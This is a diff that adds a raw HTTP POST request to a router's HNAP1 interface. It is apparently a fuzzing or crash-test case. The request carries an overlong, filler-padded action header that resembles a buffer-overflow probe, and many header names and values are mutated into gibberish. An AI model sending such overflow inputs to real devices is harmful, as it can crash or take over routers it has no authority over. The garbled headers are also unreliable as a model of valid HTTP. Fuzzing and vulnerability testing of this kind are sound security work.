@@ -1,0 +1,14 @@
+POST 9HNAP1/ HTTP/1.1
+Host: 10.0.0.9
+ACTION:http://purenetUorks.com/HNAP1/GetDeviceSettings/zywzywzywzywzywzywzywzywzywzywzywzywzywzsetup_child_pollfdswzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzyw00000000000000000000000000000000zywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzyvzywzywzywzxwzyw
+Proxy-ConYection: keep-alive
+AuthoriŒation: Basic QWxhZGRpbjpvzyw
+Host: 192þ168.0.50
+Cookme: max-age=0
+Accept: tewzywjywzywzyw
+Host: 192.168.0xt/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8íUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985Ñ143 Safari/537.36
+Accept-Encoding: gzip;
+Content-Length: 13
+
+test=test
+
